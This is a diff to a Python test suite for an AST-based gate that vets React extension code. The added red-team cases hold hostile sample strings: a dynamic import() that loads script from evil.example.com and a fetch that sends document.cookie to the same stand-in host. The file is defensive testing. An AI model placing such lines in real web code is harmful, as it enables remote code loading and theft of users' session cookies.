@@ -37,11 +37,24 @@ try:
     import_bad = "import axios from 'axios'\nexport default function Demo(){ return <div/> }\n"
     bare_bad = "import './styles.css'\nexport default function Demo(){ return <div/> }\n"
 
-    # the gate: passes valid, rejects each break-the-build class
+    # the gate (AST-checked): passes valid, rejects each break-the-build / dangerous class
     check("gate passes valid react code", suite._gate_extension(valid) is None)
+    check("gate passes valid /api fetch", suite._gate_extension(
+        "export default function X(){ fetch('/api/now'); return <div/> }") is None)
     check("gate rejects a SYNTAX error", bool(suite._gate_extension(syntax_bad)))
-    check("gate rejects a non-react import (unresolved-module break)", "only import from 'react'" in (suite._gate_extension(import_bad) or ""))
+    check("gate rejects a non-react import", bool(suite._gate_extension(import_bad)))
     check("gate rejects a bare import", bool(suite._gate_extension(bare_bad)))
+    # red-team B1 bypasses — all must now be REJECTED (AST, not regex)
+    check("gate rejects dynamic import() of a URL (RCE vector)", bool(suite._gate_extension(
+        "export default function X(){ import('https://evil.example.com/x.js'); return <div/> }")))
+    check("gate rejects `export * from 'axios'` (build-break)", bool(suite._gate_extension(
+        "export * from 'axios'\nexport default function X(){ return <div/> }")))
+    check("gate rejects `export { x } from 'axios'`", bool(suite._gate_extension(
+        "export { default as ax } from 'axios'\nexport default function X(){ return <div/> }")))
+    check("gate rejects spaced require ()", bool(suite._gate_extension(
+        "const fs = require ('fs')\nexport default function X(){ return <div/> }")))
+    check("gate rejects fetch to an external URL (exfil)", bool(suite._gate_extension(
+        "export default function X(){ fetch('https://evil.example.com/?c='+document.cookie); return <div/> }")))
 
     # THE decisive property: an operator-approved BROKEN extension is rejected + NEVER written live
     name = "gatetest_broken_xyz"
